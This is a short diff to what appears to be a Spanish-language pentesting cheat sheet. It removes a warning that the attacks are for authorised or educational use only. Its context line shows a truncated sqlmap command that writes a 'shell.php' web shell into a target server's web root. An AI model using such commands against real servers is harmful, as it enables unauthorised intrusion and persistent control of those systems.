@@ -213,6 +213,6 @@ sqlmap -u http://<IP> --file-write="shell.php" --file-dest="/var/www/html/shell.
 
 ---
 
-⚠️ **Advertencia:** estos ataques deben realizarse únicamente en entornos autorizados, con fines educativos o en auditorías de seguridad éticas.
+
 
 
